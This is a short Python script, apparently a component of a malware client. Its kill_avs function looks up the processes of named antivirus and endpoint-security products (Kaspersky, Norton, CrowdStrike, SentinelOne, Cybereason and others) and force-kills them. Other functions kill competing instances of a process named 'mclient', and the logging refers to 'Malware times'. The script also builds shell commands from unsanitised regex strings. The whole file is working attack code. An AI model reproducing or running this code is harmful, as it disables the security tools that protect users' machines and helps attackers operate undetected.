#!/usr/bin/python3
import logging
import os
import signal
from time import sleep
from queue import Queue

def get_pids(regex):
    cmd = f"ps -aef | grep -i -E '{regex}' | grep -v 'grep' | awk '{{print $2}}'" 
    output = os.popen(cmd).read()
    pids = output.replace('PID','').strip().split('\n')
    pids = [int(pid) for pid in pids if pid != '']    
    return pids

def get_times(regex):
    cmd = f"ps -aef | grep -i -E '{regex}' | grep -v 'grep' | awk '{{print $5}}'" 
    output = os.popen(cmd).read()
    times = output.replace('Time','').strip().split('\n')
    logging.info(f"Malware times: {times}")
    return times

def kill_avs(avs: list = ['antivirus', 'kaspersky', 'norton', 'corwdstrike', 'deepinstinct', 'sentinelone', 'checkpoint', 'cybereason']):
    avs = [ f"{av}" for av in avs]
    logging.info(avs)
    for av in avs:
        pids = get_pids(av)
        logging.info(f"Check for: {av} found pids: {pids} killing processes...")
        for pid in get_pids(av):
            os.kill(pid, signal.SIGKILL)

def check_parent():
    if len(get_pids('*mclient$')) >= 3:
        return True
    return False

def wait_parent():
    my_pid = os.getpid()
    for pid in get_pids('*mclient$'):
        if my_pid != pid:
            if pid+1 != my_pid:  
                if pid-1 != my_pid:            
                    sleep(1)
                    os.kill(pid, signal.SIGKILL)